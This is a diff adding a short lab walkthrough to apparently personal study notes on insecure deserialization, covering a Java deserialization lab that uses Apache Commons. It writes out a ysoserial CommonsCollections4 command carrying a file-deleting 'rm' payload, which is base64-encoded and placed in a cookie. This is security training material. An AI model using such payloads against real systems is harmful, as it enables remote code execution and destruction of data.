@@ -53,3 +53,13 @@ If you have source code access, you should start by looking for unserialize() an
 
 -------------------------------------------------------------------------------------------------------------------------------------
 
+#5 Lab : Exploiting Java deserialization with Apache Commons
+
+      1. Send the request to repeater and analyze the cookie
+      2. In wsl run:-
+            java -jar ysoserial-all.jar CommonsCollections4 'rm /home/carlos/morale.txt' | base64 -w 0
+
+      3. Copy the o/p in place of cookie and url encode and send the request and lab is solved
+
+--------------------------------------------------------------------------------------------------------------------------------------
+ 
